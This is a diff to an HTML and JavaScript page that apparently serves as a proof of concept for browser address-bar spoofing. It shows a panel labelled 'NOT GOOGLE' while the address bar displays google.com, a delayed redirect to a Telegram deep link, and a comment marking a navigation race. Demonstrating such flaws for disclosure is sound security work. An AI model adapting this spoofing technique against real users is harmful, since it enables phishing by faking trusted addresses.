@@ -26,16 +26,22 @@ button {
   max-width: 420px;
   margin: 80px auto;
   background: #fff;
-  padding: 24px;
+  padding: 32px;
   border-radius: 16px;
   box-shadow: 0 20px 60px rgba(0,0,0,.2);
   text-align: center;
 }
 
+#spoof {
+  font-size: 28px;
+  font-weight: 600;
+  color: #b00020;
+}
+
 .notice {
   margin-top: 14px;
   font-size: 13px;
-  color: #b00020;
+  color: #666;
 }
 </style>
 </head>
@@ -47,23 +53,28 @@ button {
 </div>
 
 <div id="panel">
-  <h2>Continue</h2>
-  <p>Tap the button below.</p>
-  <button onclick="action()">Continue</button>
-  <div class="notice">Demo only</div>
+  <div id="spoof">NOT GOOGLE</div>
+  <button onclick="openTelegram()">Open Telegram</button>
+  <div class="notice">
+    Address bar shows google.com
+  </div>
 </div>
 
 <script>
 function logEvent() {}
 
-function action() {
+function openTelegram() {
   setTimeout(() => {
     location.href = 'tg://resolve?domain=telegram';
   }, 300);
 }
 
-const panel = document.getElementById('panel');
+const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
+
+/* =========================
+   BAGIAN INI TIDAK DIUBAH
+   ========================= */
 
 trigger.onclick = () => {
   logEvent("poc_started");
@@ -72,6 +83,7 @@ trigger.onclick = () => {
   panel.style.display = 'block';
 };
 
+/* Step 2: Navigation race */
 window.addEventListener('pageshow', () => {
   logEvent("pageshow");
 
